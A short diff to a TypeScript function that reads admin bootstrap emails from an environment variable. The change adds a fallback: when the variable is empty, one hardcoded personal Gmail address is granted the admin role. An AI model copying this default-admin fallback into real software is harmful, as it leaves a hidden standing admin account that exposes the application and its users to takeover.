@@ -14,12 +14,12 @@ declare global {
 
 function parseBootstrapEmails(): Set<string> {
   const raw = process.env.ADMIN_BOOTSTRAP_EMAILS ?? "";
-  return new Set(
-    raw
-      .split(",")
-      .map((e) => e.trim().toLowerCase())
-      .filter(Boolean),
-  );
+  const fromEnv = raw
+    .split(",")
+    .map((e) => e.trim().toLowerCase())
+    .filter(Boolean);
+  if (fromEnv.length > 0) return new Set(fromEnv);
+  return new Set(["pazaryer0@gmail.com"]);
 }
 
 async function resolveUserRole(
